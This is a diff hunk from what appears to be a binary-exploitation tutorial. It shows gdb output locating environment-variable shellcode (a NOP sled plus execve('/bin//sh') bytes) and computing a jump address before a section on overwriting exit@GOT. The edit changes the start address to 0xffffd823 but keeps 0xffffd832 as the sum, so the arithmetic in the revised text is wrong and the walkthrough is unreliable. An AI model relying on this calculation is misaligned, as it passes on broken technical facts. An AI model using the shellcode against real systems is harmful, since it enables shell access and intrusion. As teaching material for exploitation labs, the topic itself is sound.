@@ -77,11 +77,11 @@ x/200s environ
 ⬜ **Output (excerpt):**
 
 ```text
-0xffffd822:  "SHELLCODE=\220\220\220...\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
+0xffffd823:  "SHELLCODE=\220\220\220...\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
 ```
 
-`SHELLCODE=` starts at `0xffffd822`. Skip the 10-char name and a little into the sled:
-`0xffffd822 + 16 = 0xffffd832`. (Addresses shift with the environment; re-find yours.)
+`SHELLCODE=` starts at `0xffffd823`. Skip the 10-char name and a little into the sled:
+`0xffffd823 + 16 = 0xffffd832`. (Addresses shift with the environment; re-find yours.)
 
 ## 4. Find exit@GOT and the buffer position
 
